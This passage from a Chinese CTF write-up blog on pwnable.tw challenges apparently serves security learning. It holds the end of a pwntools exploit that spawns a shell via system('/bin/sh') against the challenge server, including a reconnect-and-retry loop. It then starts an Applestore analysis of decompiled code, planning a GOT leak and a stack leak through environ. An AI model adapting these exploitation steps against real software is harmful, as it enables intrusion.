    bin_sh <span class="token operator">=</span> libc_addr <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    slog<span class="token punctuation">[</span><span class="token string">'bin_sh'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bin_sh

    add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x2f</span><span class="token punctuation">)</span> <span class="token comment">#add 2</span>
    edit<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span> <span class="token comment">#power_up</span>

    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token string">b'\x9f'</span><span class="token operator">*</span><span class="token number">7</span><span class="token punctuation">,</span>system<span class="token punctuation">,</span><span class="token string">'BoBo'</span><span class="token punctuation">,</span>bin_sh<span class="token punctuation">)</span>

    edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    hit<span class="token punctuation">(</span><span class="token punctuation">)</span>
	

context<span class="token punctuation">.</span>os<span class="token operator">=</span><span class="token string">'linux'</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>

slog <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span> <span class="token punctuation">:</span> <span class="token number">111</span><span class="token punctuation">}</span>
local <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> arch<span class="token operator">==</span><span class="token number">64</span><span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
<span class="token keyword">if</span> arch<span class="token operator">==</span><span class="token number">32</span><span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'i386'</span>

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bin'</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'chall.pwnable.tw'</span><span class="token punctuation">,</span><span class="token number">10103</span><span class="token punctuation">)</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bin'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/ctf/work/pwnable/sb/libc.so.6'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">gdba</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> local <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    cmd <span class="token operator">=</span><span class="token string">'set follow-fork-mode parent\n'</span>
    <span class="token comment">#cmd=''</span>
    <span class="token keyword">if</span> pie<span class="token punctuation">:</span>
        base <span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">&quot;pmap {}|grep bin |awk '{{print $1}}'&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
        cmd <span class="token operator">+=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'b *{:#x}\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>b<span class="token operator">+</span>base<span class="token punctuation">)</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> bps<span class="token punctuation">]</span><span class="token punctuation">)</span>
        cmd <span class="token operator">+=</span><span class="token string">'set $base={:#x}\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span>
        slog<span class="token punctuation">[</span><span class="token string">'base'</span><span class="token punctuation">]</span> <span class="token operator">=</span> base	
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        cmd<span class="token operator">+=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'b *{:#x}\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> bps<span class="token punctuation">]</span><span class="token punctuation">)</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>cmd<span class="token punctuation">)</span>

re  <span class="token operator">=</span> <span class="token keyword">lambda</span> m<span class="token punctuation">,</span> t <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>m<span class="token punctuation">,</span> timeout<span class="token operator">=</span>t<span class="token punctuation">)</span>
recv<span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
sd  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ia  <span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
sa  <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
<span class="token comment"># after a, send b;</span>

<span class="token keyword">def</span> <span class="token function">slog_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> slog<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token string">' ==&gt; '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>slog<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">blast</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>

        exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>
            io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span>
        io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

exp<span class="token punctuation">(</span><span class="token punctuation">)</span>

slog_show<span class="token punctuation">(</span><span class="token punctuation">)</span>

ia<span class="token punctuation">(</span><span class="token punctuation">)</span>


</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br><span class="line-number">112</span><br><span class="line-number">113</span><br><span class="line-number">114</span><br><span class="line-number">115</span><br><span class="line-number">116</span><br><span class="line-number">117</span><br><span class="line-number">118</span><br><span class="line-number">119</span><br><span class="line-number">120</span><br><span class="line-number">121</span><br><span class="line-number">122</span><br><span class="line-number">123</span><br><span class="line-number">124</span><br></div></div></details> <h2 id="applestore"><a href="#applestore" class="header-anchor">#</a> Applestore</h2> <h4 id="分析-8"><a href="#分析-8" class="header-anchor">#</a> 分析</h4> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/mnt/f/pwnable.tw/applestore/applestore'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>无<code>PIE</code>和能修改<code>GOT</code>表。</p> <p>add()函数主要是给我们显示价格的。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-2Ch]</span>
  <span class="token keyword">char</span> nptr<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+26h] [ebp-22h] BYREF</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [esp+3Ch] [ebp-Ch]</span>

  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Device Number&gt; &quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">my_read</span><span class="token punctuation">(</span>nptr<span class="token punctuation">,</span> <span class="token number">0x15u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token function">atoi</span><span class="token punctuation">(</span>nptr<span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
      v1 <span class="token operator">=</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token string">&quot;iPhone 6&quot;</span><span class="token punctuation">,</span> <span class="token number">199</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">insert</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">goto</span> LABEL_8<span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
      v1 <span class="token operator">=</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token string">&quot;iPhone 6 Plus&quot;</span><span class="token punctuation">,</span> <span class="token number">299</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">insert</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">goto</span> LABEL_8<span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>
      v1 <span class="token operator">=</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token string">&quot;iPad Air 2&quot;</span><span class="token punctuation">,</span> <span class="token number">499</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">insert</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">goto</span> LABEL_8<span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>
      v1 <span class="token operator">=</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token string">&quot;iPad Mini 3&quot;</span><span class="token punctuation">,</span> <span class="token number">399</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">insert</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">goto</span> LABEL_8<span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>
      v1 <span class="token operator">=</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token string">&quot;iPod Touch&quot;</span><span class="token punctuation">,</span> <span class="token number">199</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">insert</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
LABEL_8<span class="token operator">:</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;You've put *%s* in your shopping cart.\n&quot;</span><span class="token punctuation">,</span> <span class="token operator">*</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Brilliant! That's an amazing idea.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">default</span><span class="token operator">:</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Stop doing that. Idiot!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br></div></div><div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>__cdecl <span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>a2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-Ch]</span>

  v3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> a2<span class="token punctuation">;</span>
  <span class="token function">asprintf</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token string">&quot;%s&quot;</span><span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v3<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> v3<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p><code>create</code>里面主要是利用<code>asprintf()</code>把这些苹果商品写入栈中。</p> <div class="custom-block tip"><p class="custom-block-title">asprintf</p> <p>解释：asprintf可以通过第一个参数作为指针写入，然后函数最后会进行一个free操作</p></div> <p>之前以为会是利用<code>asprintf()</code>进行什么堆泄露之类的。后面发现并不能用</p> <p>在<code>checkout()</code>函数中<code>asprintf()</code>写入的是栈的地址</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">checkout</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [esp+10h] [ebp-28h]</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>v2<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+18h] [ebp-20h] BYREF</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [esp+2Ch] [ebp-Ch]</span>

  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token function">cart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> <span class="token number">7174</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;*: iPhone 8 - $1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">asprintf</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> <span class="token string">&quot;%s&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;iPhone 8&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">// 这次写在栈上，似乎可以利用</span>
    v2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token function">insert</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    v1 <span class="token operator">=</span> <span class="token number">7175</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Total: $%d\n&quot;</span><span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Want to checkout? Maybe next time!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><p>然后通过<code>cart()</code>知道能复写修改栈内数据，进行一个写入。这样我们就能写入<code>atoi_got</code>泄露得到<code>libc</code>地址</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">int</span> <span class="token function">cart</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [esp+18h] [ebp-30h]</span>
  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-2Ch]</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+20h] [ebp-28h]</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+26h] [ebp-22h] BYREF</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [esp+3Ch] [ebp-Ch]</span>

  v6 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v2 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Let me check your cart. ok? (y/n) &gt; &quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">my_read</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">21u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token comment">// 可以复写</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'y'</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;==== Cart ====&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> cart_addr<span class="token punctuation">;</span> i<span class="token punctuation">;</span> i <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      v0 <span class="token operator">=</span> v2<span class="token operator">++</span><span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;%d: %s - $%d\n&quot;</span><span class="token punctuation">,</span> v0<span class="token punctuation">,</span> <span class="token operator">*</span>i<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      v3 <span class="token operator">+=</span> <span class="token operator">*</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> v3<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div><p>后面就困扰了很久，没办法利用了。看了大佬们的wp才知道，可以利用<code>environ</code>进行泄露栈地址。然后利用<code>delete()</code>函数进行对栈上的<code>iPhone8</code>修改</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [esp+10h] [ebp-38h]</span>
  <span class="token keyword">int</span> addr<span class="token punctuation">;</span> <span class="token comment">// [esp+14h] [ebp-34h]</span>
  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [esp+18h] [ebp-30h]</span>
  <span class="token keyword">int</span> fd<span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-2Ch]</span>
  <span class="token keyword">int</span> bk<span class="token punctuation">;</span> <span class="token comment">// [esp+20h] [ebp-28h]</span>
